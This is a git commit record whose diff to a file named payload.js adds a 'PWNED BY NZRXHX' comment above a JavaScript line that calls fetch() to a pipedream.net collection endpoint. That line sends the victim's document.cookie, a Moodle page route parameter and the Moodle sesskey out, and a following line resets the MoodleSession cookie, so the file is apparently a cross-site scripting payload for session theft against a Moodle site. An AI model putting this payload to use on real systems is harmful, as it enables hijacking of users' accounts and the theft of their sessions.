11176a8dea362cb1b5f9d46af533964beedb4e5c
NZRXHX <hachimi.nizar.etu@gmail.com>
2025-12-14 23:55:35 +0100

    Remove comment and fix IIFE syntax in payload.js

--- payload.js
+++ payload.js
@@ -1,3 +1,4 @@
+//btw PWNED BY NZRXHX
 fetch('//eoizd5ecl7m1qqn.m.pipedream.net/?c='+document.cookie+"&id="+document.querySelector('[data-route="view-settings"]').getAttribute('data-route-param')+"&sesskey="+M.cfg.sesskey);
 document.cookie='MoodleSession=0;path=/';
 (() => {
